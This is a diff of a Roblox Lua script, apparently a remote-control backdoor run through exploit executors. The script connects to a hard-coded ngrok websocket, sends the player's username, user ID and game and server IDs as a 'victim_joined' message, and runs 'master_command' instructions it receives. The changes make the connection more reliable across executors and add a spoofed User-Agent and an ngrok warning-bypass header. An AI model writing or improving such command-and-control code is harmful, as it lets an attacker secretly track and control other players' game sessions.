@@ -1,6 +1,10 @@
 -- -Broma
 if not game:IsLoaded() then
-    pcall(function() game.Loaded:Wait() end)
+    local t = 0
+    while not game:IsLoaded() and t < 6 do
+        task.wait(0.2)
+        t = t + 0.2
+    end
 end
 
 local HttpService = game:GetService("HttpService")
@@ -10,32 +14,104 @@ local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local TeleportService = game:GetService("TeleportService")
-local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then
+    local t = 0
+    while not LocalPlayer and t < 10 do
+        task.wait(0.1)
+        LocalPlayer = Players.LocalPlayer
+        t = t + 0.1
+    end
+end
+if not LocalPlayer then return end
 
 local WS_URL = "wss://upstairs-whenever-unveiled.ngrok-free.dev"
 
-local WS_Connect = nil
-pcall(function()
-    WS_Connect = (WebSocket and WebSocket.connect)
-        or (websocket and websocket.connect)
-        or (syn and syn.websocket and syn.websocket.connect)
-        or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
-        or (getgenv and getgenv().websocket and getgenv().websocket.connect)
-end)
+local function getWSConnector()
+    local list = {
+        WebSocket,
+        websocket,
+        (getgenv and getgenv().WebSocket),
+        (getgenv and getgenv().websocket),
+        (syn and syn.websocket),
+        (syn and syn.WebSocket),
+    }
+    for _, item in ipairs(list) do
+        if type(item) == "table" then
+            if type(item.connect) == "function" then return item.connect end
+            if type(item.Connect) == "function" then return item.Connect end
+        elseif type(item) == "function" then
+            return item
+        end
+    end
+    return nil
+end
+
+local WS_Connect = getWSConnector()
 if not WS_Connect then return end
 
-pcall(function()
-    local httpUrl = string.gsub(WS_URL, "wss://", "https://")
-    game:HttpGet(httpUrl)
-end)
-task.wait(0.5)
+local function safeSend(s, msg)
+    if not s then return false end
+    local f = s.Send or s.send
+    if type(f) == "function" then
+        return pcall(f, s, msg)
+    end
+    return false
+end
+
+local function safeClose(s)
+    if not s then return end
+    local f = s.Close or s.close
+    if type(f) == "function" then
+        pcall(f, s)
+    end
+end
+
+local function setupEvents(s, onMsg, onClose)
+    pcall(function()
+        if s.OnMessage and type(s.OnMessage.Connect) == "function" then
+            s.OnMessage:Connect(onMsg)
+        elseif s.onmessage and type(s.onmessage.Connect) == "function" then
+            s.onmessage:Connect(onMsg)
+        else
+            s.OnMessage = onMsg
+            s.onmessage = onMsg
+        end
+    end)
+    pcall(function()
+        if s.OnClose and type(s.OnClose.Connect) == "function" then
+            s.OnClose:Connect(onClose)
+        elseif s.onclose and type(s.onclose.Connect) == "function" then
+            s.onclose:Connect(onClose)
+        else
+            s.OnClose = onClose
+            s.onclose = onClose
+        end
+    end)
+end
+
+local function tryOpenWS(url)
+    local ok, s = pcall(function()
+        return WS_Connect(url, {
+            ["ngrok-skip-browser-warning"] = "true",
+            ["User-Agent"] = "Roblox/WinInet"
+        })
+    end)
+    if ok and s then return s end
+    local ok2, s2 = pcall(function()
+        return WS_Connect(url)
+    end)
+    if ok2 and s2 then return s2 end
+    return nil
+end
 
 local mySessionId = tick() .. "_" .. math.random(1000, 9999)
 _G.SacredVictimSessionId = mySessionId
 
-pcall(function()
-    if _G.SacredVictimWSV2 then _G.SacredVictimWSV2:Close() end
-end)
+if _G.SacredVictimWSV2 then
+    safeClose(_G.SacredVictimWSV2)
+end
 
 local currentJail = nil
 local isSpinning = false
@@ -416,48 +492,42 @@ end
 
 task.spawn(function()
     while _G.SacredVictimSessionId == mySessionId do
-        local ok, ws = pcall(function() return WS_Connect(WS_URL) end)
+        local ws = tryOpenWS(WS_URL)
 
-        if ok and ws then
+        if ws then
             _G.SacredVictimWSV2 = ws
             local isClosed = false
 
             local function sendPresence(msgType)
                 local currentJob = tostring(game.JobId or "")
-                local sendOk = pcall(function()
-                    ws:Send(HttpService:JSONEncode({
-                        type = msgType or "victim_joined",
-                        username = LocalPlayer.Name,
-                        userId = LocalPlayer.UserId,
-                        placeId = game.PlaceId,
-                        gameId = game.GameId,
-                        jobId = currentJob
-                    }))
-                end)
+                local sendOk = safeSend(ws, HttpService:JSONEncode({
+                    type = msgType or "victim_joined",
+                    username = LocalPlayer.Name,
+                    userId = LocalPlayer.UserId,
+                    placeId = game.PlaceId,
+                    gameId = game.GameId,
+                    jobId = currentJob
+                }))
                 if not sendOk then isClosed = true end
             end
 
             task.wait(0.3)
             sendPresence("victim_joined")
 
-            pcall(function()
-                ws.OnMessage:Connect(function(raw)
-                    if _G.SacredVictimSessionId ~= mySessionId then return end
-                    local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
-                    if s and data then
-                        if data.type == "ping_victims" then
-                            sendPresence("victim_joined")
-                        elseif data.type == "master_command" then
-                            task.spawn(function()
-                                pcall(handleCommand, data)
-                            end)
-                        end
+            setupEvents(ws, function(raw)
+                if _G.SacredVictimSessionId ~= mySessionId then return end
+                local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
+                if s and data then
+                    if data.type == "ping_victims" then
+                        sendPresence("victim_joined")
+                    elseif data.type == "master_command" then
+                        task.spawn(function()
+                            pcall(handleCommand, data)
+                        end)
                     end
-                end)
-            end)
-
-            pcall(function()
-                ws.OnClose:Connect(function() isClosed = true end)
+                end
+            end, function()
+                isClosed = true
             end)
 
             while not isClosed and _G.SacredVictimWSV2 == ws and _G.SacredVictimSessionId == mySessionId do
